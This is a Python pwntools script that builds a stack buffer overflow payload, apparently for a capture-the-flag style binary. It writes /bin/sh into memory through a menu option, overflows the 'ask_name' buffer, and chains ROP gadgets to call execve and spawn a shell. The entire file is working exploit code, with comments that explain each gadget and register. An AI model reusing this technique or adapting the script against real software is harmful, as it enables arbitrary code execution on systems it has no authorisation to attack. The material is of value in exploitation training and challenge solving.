from pwn import *

outfile = open("exploitstring", "wb")

# Filling /bin/sh string at 0x20000000
payload = b'1'
payload += b'\n'
payload += b'6e69622f' # /bin
payload += b'\n'
payload += b'0068732f' # /sh\0
payload += b'\n'
# Fill the rest with 0s
for i in range(7):
    payload += b'0'
    payload += b'\n'
    payload += b'0'
    payload += b'\n'

# Invoke ask_name function
payload += b'3'
payload += b'\n'
payload += b'a' * 64

payload += p64(0) # rbp value

# From here it is all return addresses

#0x000000000040100b: pop rax; ret;
# 59 is execve
payload += p64(0x40100b)
payload += p64(59)

#0x0000000000401253: pop rdi; ret;
payload += p64(0x401253)
payload += p64(0x20000000) # points to "/bin/sh" that we loaded earlier

#0x00000000004018ad: pop rsi; ret;
payload += p64(0x4018ad)
payload += p64(0) # argv = NULL

#0x0000000000401255: pop rdx; ret;
payload += p64(0x401255)
payload += p64(0) # envp = NULL

#0x0000000000403e77: syscall; ret;
payload += p64(0x403e77)

payload += b'\n'

outfile.write(payload)
